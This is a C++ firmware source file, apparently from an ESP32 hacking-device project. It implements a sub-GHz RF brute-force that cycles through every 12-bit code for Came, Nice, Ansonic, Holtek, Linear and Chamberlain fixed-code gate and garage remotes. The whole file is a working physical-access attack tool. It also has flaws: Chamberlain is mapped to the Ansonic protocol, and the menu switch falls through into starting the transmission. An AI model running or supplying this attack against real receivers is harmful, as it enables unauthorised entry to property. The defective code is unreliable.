#include "rf_bruteforce.h"

#include "protocols/Ansonic.h"
#include "protocols/Came.h"
#include "protocols/Chamberlain.h"
#include "protocols/Holtek.h"
#include "protocols/Linear.h"
#include "protocols/NiceFlo.h"
#include "protocols/protocol.h"
#include "rf_utils.h"

float brute_frequency = 433.92;
String brute_protocol = "Nice 12 Bit";
int brute_repeats = 1;

void rf_brute_frequency() {
    options = {};
    int ind = 0;
    int arraySize = sizeof(subghz_frequency_list) / sizeof(subghz_frequency_list[0]);
    for (int i = 0; i < arraySize; i++) {
        String tmp = String(subghz_frequency_list[i], 2) + "Mhz";
        options.push_back({tmp.c_str(), [=]() { brute_frequency = subghz_frequency_list[i]; }});
    }
    loopOptions(options, ind);
    options.clear();
}

void rf_brute_protocol() {
    const String protocol_list[] = {
        "Came 12 Bit",
        "Nice 12 Bit",
        "Ansonic 12 Bit",
        "Holtek 12 Bit",
        "Linear 12 Bit",
        "Chamberlain 12 Bit",
    };

    options = {};
    int ind = 0;
    int arraySize = sizeof(protocol_list) / sizeof(protocol_list[0]);
    for (int i = 0; i < arraySize; i++) {
        String tmp = protocol_list[i];
        options.push_back({tmp.c_str(), [=]() { brute_protocol = protocol_list[i]; }});
    }
    loopOptions(options, ind);
    options.clear();
}

void rf_brute_repeats() {
    const int protocol_list[] = {1, 2, 3, 4, 5};

    options = {};
    int ind = 0;
    int arraySize = sizeof(protocol_list) / sizeof(protocol_list[0]);
    for (int i = 0; i < arraySize; i++) {
        int tmp = protocol_list[i];
        options.push_back({String(tmp).c_str(), [=]() { brute_repeats = protocol_list[i]; }});
    }
    loopOptions(options, ind);
    options.clear();
}

bool rf_brute_start() {
    int txpin;

    if (bruceConfigPins.rfModule == CC1101_SPI_MODULE) {
        txpin = bruceConfigPins.CC1101_bus.io0;
        if (!initRfModule("tx", brute_frequency)) return false;
    } else {
        txpin = bruceConfigPins.rfTx;
        if (!initRfModule("tx")) return false;
    }

    c_rf_protocol *protocol = nullptr;
    int bits = 0;

    if (brute_protocol == "Nice 12 Bit") {
        protocol = new protocol_nice_flo();
        bits = 12;
    } else if (brute_protocol == "Came 12 Bit") {
        protocol = new protocol_came();
        bits = 12;
    } else if (brute_protocol == "Ansonic 12 Bit") {
        protocol = new protocol_ansonic();
        bits = 12;
    } else if (brute_protocol == "Holtek 12 Bit") {
        protocol = new protocol_holtek();
        bits = 12;
    } else if (brute_protocol == "Linear 12 Bit") {
        protocol = new protocol_linear();
        bits = 12;
    } else if (brute_protocol == "Chamberlain 12 Bit") {
        protocol = new protocol_ansonic();
        bits = 12;
    } else {
        deinitRfModule();
        return false;
    }

    pinMode(txpin, OUTPUT);
    setMHZ(brute_frequency);

    auto sendPulse = [&](int duration) {
        if (duration < 0) {
            digitalWrite(txpin, LOW);
            delayMicroseconds(-duration);
        } else {
            digitalWrite(txpin, HIGH);
            delayMicroseconds(duration);
        }
    };

    for (int i = 0; i < (1 << bits); ++i) {
        for (int r = 0; r < brute_repeats; ++r) {
            for (const auto &pulse : protocol->pilot_period) { sendPulse(pulse); }

            for (int j = bits - 1; j >= 0; --j) {
                bool bit = (i >> j) & 1;
                const std::vector<int> &timings = protocol->transposition_table[bit ? '1' : '0'];
                for (auto duration : timings) { sendPulse(duration); }
            }

            for (const auto &pulse : protocol->stop_bit) { sendPulse(pulse); }
        }

        if (check(EscPress)) break;

        if (i % 10 == 0) {
            displayRedStripe(
                String(i) + "/" + String((1 << bits)) + " " + brute_protocol,
                getComplementaryColor2(bruceConfig.priColor),
                bruceConfig.priColor
            );
        }
    }

    deinitRfModule();
    delete protocol;
    return true;
}

void rf_bruteforce() {
    int option = 0;
    options = {
        {"Frequency", [&]() { option = 1; }},
        {"Repeats",   [&]() { option = 2; }},
        {"Protocol",  [&]() { option = 3; }},
        {"Start",     [&]() { option = 4; }},
        {"Main Menu", [&]() { option = 5; }},
    };
    loopOptions(options);

    switch (option) {
        case 1: rf_brute_frequency();
        case 2: rf_brute_repeats();
        case 3: rf_brute_protocol();
        case 4: rf_brute_start();
        case 5: return;
    }
}
